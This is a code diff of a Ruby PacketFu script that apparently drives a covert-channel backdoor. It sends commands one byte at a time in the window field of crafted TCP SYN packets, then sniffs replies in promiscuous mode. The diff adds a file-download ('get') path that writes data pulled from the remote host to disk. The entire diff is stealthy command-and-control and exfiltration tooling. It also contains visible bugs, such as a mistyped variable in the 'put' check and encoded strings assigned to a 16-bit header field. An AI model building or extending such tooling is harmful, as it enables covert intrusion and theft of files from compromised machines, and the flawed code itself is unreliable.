@@ -48,7 +48,7 @@ def encode(hash)
     return Base64::encode64(Base64::encode64(hash))
 end
 
-def wait_response
+def wait_cmd_response
     cap = PacketFu::Capture.new(:iface => @opts[:iface], :start => true,
                 :promisc => true)
     response = ""
@@ -72,6 +72,72 @@ def wait_response
     end # cap
 end
 
+def wait_get_response(cmd)
+    cap = PacketFu::Capture.new(:iface => @opts[:iface], :start => true,
+                :promisc => true)
+    cmds = cmd.split(' ')
+    filename = cmds[1].split('/').last
+    
+    file = File.open(filename, "wb")
+    
+    cap.stream.each do |pkt|
+        if PacketFu::TCPPacket.can_parse?(pkt) then
+            packet = PacketFu::Packet.parse pkt
+            
+            if packet.tcp_flags.fin == 1 then
+                return
+            elsif packet.tcp_dst == @opts[:lport] then
+                file.write(decode(packet.tcp_win))
+            end
+        end # can_parse?
+    end # cap
+end
+
+def send_command(cmd, code)
+    #---------------------------------------------------------------------------
+    # Send one byte at a time
+    #---------------------------------------------------------------------------
+    cmd.each_byte do |word|
+        tcp = PacketFu::TCPPacket.new
+        
+        tcp.eth_saddr = cfg[:eth_saddr]
+        tcp.tcp_src = rand(0xfff - 1024) + 1024
+        tcp.tcp_dst = @opts[:sport]
+        tcp.tcp_flags.syn = 1;
+        tcp.tcp_win = encode(word)
+        tcp.tcp_seq = rand(0xffff)
+        tcp.ip_saddr = cfg[:ip_saddr]
+        tcp.ip_daddr = @opts[:host] 
+        
+        tcp.recalc
+        tcp.to_w(@opts[:iface])
+    end
+
+    #---------------------------------------------------------------------------
+    # Send FIN packet
+    #---------------------------------------------------------------------------
+    tcp_fin = PacketFu::TCPPacket.new
+
+    tcp_fin.eth_saddr = cfg[:eth_saddr]
+    tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
+    tcp_fin.tcp_dst = @opts[:sport]
+    tcp_fin.tcp_flags.fin = 1;
+    tcp_fin.tcp_seq = rand(0xffff)
+    tcp_fin.ip_saddr = cfg[:ip_saddr]
+    tcp_fin.ip_daddr = @opts[:host]    
+
+    tcp_fin.recalc
+    tcp_fin.to_w(@opts[:iface])
+
+    if code == 1 then # Regular Command
+        wait_cmd_response
+    elsif code == 2 then # Get Command
+        wait_get_response(cmd)
+    elsif code == 3 then # Put Command
+    
+    end 
+end
+
 #
 #
 #
@@ -85,41 +151,12 @@ def prompt
         
         if cmds[0] == "quit" or cmds[0] == "q" then # Quit
             abort("Quitting...")
-        elsif cmds[0] == "get" then # Get File
-            
+        elsif cmds[0] == "get" or cmds[0] == "g" then # Get File
+            send_command(cmd, 2)
+        elsif cmds[0] == "put" or cmd[0] == "p" then # Put File
+            send_command(cmd, 3)
         else # Generic Command            
-            cmd.each_byte do |word|
-                tcp = PacketFu::TCPPacket.new
-                
-                tcp.eth_saddr = cfg[:eth_saddr]
-                #tcp.eth_daddr = cfg[:eth_daddr]
-                tcp.tcp_src = rand(0xfff - 1024) + 1024
-                tcp.tcp_dst = @opts[:sport]
-                tcp.tcp_flags.syn = 1;
-                tcp.tcp_win = word
-                tcp.tcp_seq = rand(0xffff)
-                tcp.ip_saddr = cfg[:ip_saddr]
-                tcp.ip_daddr = @opts[:host] 
-                
-                tcp.recalc
-                tcp.to_w(@opts[:iface])
-            end
-            
-            tcp_fin = PacketFu::TCPPacket.new
-            
-            tcp_fin.eth_saddr = cfg[:eth_saddr]
-            #tcp_fin.eth_daddr = cfg[:eth_daddr]
-            tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
-            tcp_fin.tcp_dst = @opts[:sport]
-            tcp_fin.tcp_flags.fin = 1;
-            tcp_fin.tcp_seq = rand(0xffff)
-            tcp_fin.ip_saddr = cfg[:ip_saddr]
-            tcp_fin.ip_daddr = @opts[:host]    
-            
-            tcp_fin.recalc
-            tcp_fin.to_w(@opts[:iface])
-            
-            wait_response
+            send_command(cmd, 1)
         end
     end
 end
